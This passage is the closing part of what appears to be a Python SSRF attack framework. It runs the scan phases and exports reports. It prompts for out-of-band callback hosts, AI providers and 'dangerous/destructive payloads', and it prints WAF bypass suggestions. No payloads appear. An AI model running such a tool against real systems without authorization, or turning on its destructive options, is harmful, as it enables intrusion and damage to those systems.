                        bypass = self.waf_info.get("bypass_suggestions",[])
                        if bypass: print(f"  {DIM}Bypass: {', '.join(bypass[:3])}{RESET}")
                    else:
                        print(f"\n{CYAN}[WAF]{RESET} None detected")
            await self.detect_cloud()
            await self.basic()
            await self.run_ai_phases()
            await self.phase_websocket()
            await self.phase_grpc()
            await self.phase_k8s()
            await self.phase_serverless()
            if not self.evidence and self.verbose:
                print(f"\n{OK} No confirmed SSRF findings detected. Generating not_confirmed report.")
            self.export_nuclei()
            self.export_siem_cef()
            self.export_json_api()
            self.generate_attack_map()
            await self.generate_html()
            await self.save_json()
            self.print_summary(report_generated=True)
        finally:
            await self.stop()

async def main():
    parser = setup_argparse()
    args = parser.parse_args()
    print(BANNER)

    targets = TargetManager.from_args(args)
    if not targets:
        targets = TargetManager.interactive()
        if not targets:
            print(f"{FAIL} No targets.")
            return
        if not args.callback and not args.collaborator and not args.burp_collaborator:
            print(f"\n{BOLD}{CYAN}OOB CALLBACK SELECTION{RESET}")
            print("  1 - Default local placeholder")
            print("  2 - Burp Collaborator")
            print("  3 - Interactsh / OASTify / Custom OAST host")
            cb_choice = input(f"{WARN} Choose [1/2/3] [1]: ").strip() or "1"
            if cb_choice == "2":
                args.burp_collaborator = input("Burp Collaborator host: ").strip()
            elif cb_choice == "3":
                args.collaborator = input("Callback/OAST host: ").strip()

        if args.ai_provider is None:
            enable_ai = input(f"{WARN} Enable AI? (none/claude/openai/ollama/gemini/mistral/deepseek/sheep) [none]: ").strip().lower()
            if enable_ai and enable_ai != "none":
                args.ai_provider = enable_ai
                if enable_ai == "sheep":
                    args.ai_key = input(f"{WARN} Sheep API token: ").strip()
                elif enable_ai != "ollama":
                    args.ai_key = input(f"{WARN} API key: ").strip()
                model_choice = input(f"{WARN} Model (press Enter for default): ").strip()
                if model_choice:
                    args.ai_model = model_choice

        if not args.dangerous_payloads:
            danger = input(f"{WARN} Enable dangerous/destructive payloads? (y/N): ").strip().lower()
            if danger == "y":
                args.dangerous_payloads = True

    for i, t in enumerate(targets, 1):
        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}]{RESET} Scanning: {t}")
        await UltimateSSRFFramework(t, args).run()
        if i < len(targets):
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
